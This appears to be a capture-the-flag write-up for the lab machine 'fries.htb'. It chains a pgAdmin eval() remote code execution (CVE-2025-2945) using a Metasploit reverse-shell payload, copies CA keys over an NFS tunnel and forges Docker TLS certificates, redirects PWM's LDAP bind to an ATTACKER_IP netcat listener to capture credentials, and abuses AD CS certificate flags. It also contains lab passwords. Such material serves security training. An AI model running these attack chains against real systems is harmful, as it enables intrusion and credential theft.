Foothold — CVE-2025-2945 (pgAdmin RCE)

pgAdmin Authentication

pgAdmin 9.1.0 runs at db-mgmt05.fries.htb. The React SPA login requires matching the CSRF token format:

python
r    = s.get(f"{TARGET}/login")
csrf = re.search(r'csrfToken":\s*"([\w+.-]+)"', r.text).group(1)

r = s.post(f"{TARGET}/authenticate/login", data={
    "csrf_token":      csrf,
    "email":           "[email protected]",
    "password":        "D4LE11maan!!",
    "language":        "en",
    "internal_button": "Login"
}, allow_redirects=True)
CVE-2025-2945 Exploitation
CVE-2025-2945
pgAdmin 4 <= 9.1.0 — Authenticated RCE via Python eval() Injection
The SQL editor download endpoint passes the query_commited parameter directly to Python’s eval(), enabling arbitrary code execution within the pgAdmin container context. An authenticated attacker can chain this to gain a remote shell.

Exploitation via Metasploit:

metasploit
use exploit/multi/http/pgadmin_query_tool_authenticated
set RHOSTS    db-mgmt05.fries.htb
set USERNAME  [email protected]
set PASSWORD  D4LE11maan!!
set DB_NAME   postgres
set DB_USER   root
set DB_PASS   PsqLR00tpaSS11
set PAYLOAD   python/meterpreter/reverse_tcp
exploit

Manual exploitation flow:

StepEndpointPurpose
1/loginAuthenticate, capture CSRF token
2/sqleditor/get_server_connection/{sgid}/{sid}Find a valid server ID
3/sqleditor/initialize/sqleditor/{trans_id}/{sgid}/{sid}/{did}Initialise the SQL editor transaction
4/sqleditor/query_tool/download/{trans_id}Inject payload via query_commited parameter
⚠  Additionally, PostgreSQL command execution is possible via COPY FROM PROGRAM through the legitimate SQL query interface, executing as the postgres user inside 172.18.0.3.

NFS Certificate Extraction

The NFS share at /srv/web.fries.htb holds a certs/ directory owned by root:infra_managers (GID 59605603). NFS is not externally accessible — an SSH tunnel is required:

bash
# Tunnel NFS port through SSH
ssh -L 2049:127.0.0.1:2049 -N [email protected]

# Mount via NFS v4
sudo mount -t nfs4 localhost:/srv/web.fries.htb /mnt/fries_nfs -o port=2049

# Create matching GID and copy certs
sudo groupadd -g 59605603 infra_managers
sudo usermod -aG infra_managers kali
sudo bash -c 'sg infra_managers -c "cp /mnt/fries_nfs/certs/* /tmp/certs/"'
✓  Retrieved: ca-key.pem  ca.pem  server-cert.pem  server-key.pem  server.csr  server-openssl.cnf
Docker authz-broker Bypass via Certificate CN Abuse

The authz-broker plugin derives Docker identity from the Common Name (CN) of the client TLS certificate. Using the retrieved CA key, we forge certificates impersonating any authorized identity:

bash
# Generate sysadm client cert (readonly container access)
openssl genrsa -out sysadm-key.pem 4096
openssl req -new -key sysadm-key.pem -out sysadm.csr -subj '/CN=sysadm'
openssl x509 -req -in sysadm.csr -CA ca.pem -CAkey ca-key.pem   -CAcreateserial -out sysadm-cert.pem -days 365 -sha256

# Generate root client cert (full access)
openssl genrsa -out root-key.pem 4096
openssl req -new -key root-key.pem -out root.csr -subj '/CN=root'
openssl x509 -req -in root.csr -CA ca.pem -CAkey ca-key.pem   -CAcreateserial -out root-cert.pem -days 365 -sha256
bash
DOCKER="docker --tlsverify --tlscacert=ca.pem --tlscert=root-cert.pem --tlskey=root-key.pem -H=127.0.0.1:2376"
$DOCKER ps

LDAP Credential Capture via PWM Config Manipulation

Rather than decrypting the AES-encrypted LDAP password, the PWM config is modified to redirect LDAP traffic to an attacker-controlled listener — forcing PWM to send the cleartext bind credentials:

StepAction
1Modify PwmConfiguration.xml: change LDAP URL to ldap://ATTACKER_IP:389 and set configIsEditable=false (forces RUNNING mode)
2Upload modified config via docker cp and restart the PWM container
3Start netcat listener on port 389 to capture raw LDAP bind packet
4Trigger LDAP bind by submitting a login attempt on the PWM web interface
5Extract cleartext password from raw LDAP bind (0x80 tag + length byte + ASCII password)
bash
# Upload config and restart PWM
docker cp /tmp/PwmConfiguration.xml pwm:/config/PwmConfiguration.xml
docker restart pwm

# Capture LDAP bind
sudo nc -nlvkp 389 > /tmp/ldap_capture.txt 2>&1

ESC7 Step 2 — Enable EDITF_ATTRIBUTESUBJECTALTNAME2 (ESC6)

Direct registry modification fails due to insufficient permissions. The ICertAdmin COM interface is used via WinRM as gMSA_CA_prod$ to set the flag through ManageCa rights:

powershell — WinRM as gMSA_CA_prod$
$ca     = New-Object -ComObject CertificateAuthority.Admin.1
$config = "DC01.fries.htbries-DC01-CA"

$currentFlags = $ca.GetConfigEntry($config,
  "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy", "EditFlags")
# Current: 0x11014e

$newFlags = $currentFlags -bor 0x40000   # Add EDITF_ATTRIBUTESUBJECTALTNAME2
# New: 0x15014e

$ca.SetConfigEntry($config,
  "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy", "EditFlags", $newFlags)
ESC7 Step 3 — Restart Certificate Service
powershell
Restart-Service CertSvc -Force
